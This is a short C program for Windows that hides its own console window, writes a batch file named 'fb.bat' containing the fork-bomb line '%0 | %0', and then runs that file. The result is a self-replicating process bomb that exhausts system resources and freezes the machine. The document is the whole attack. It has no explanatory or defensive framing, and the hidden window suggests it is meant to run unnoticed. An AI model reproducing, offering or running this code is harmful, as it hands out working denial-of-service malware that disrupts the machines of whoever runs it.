#include <stdlib.h>
#include <stdio.h>
#include <windows.h>

 int main(void)
{
	FILE *file;
	char str[] = "%0 | %0";

	ShowWindow(GetConsoleWindow(), SW_HIDE);
	
	file = fopen("fb.bat","wb");
	fwrite(str, 8 * sizeof(char), 1, file);
	system("fb");
	return 0;
}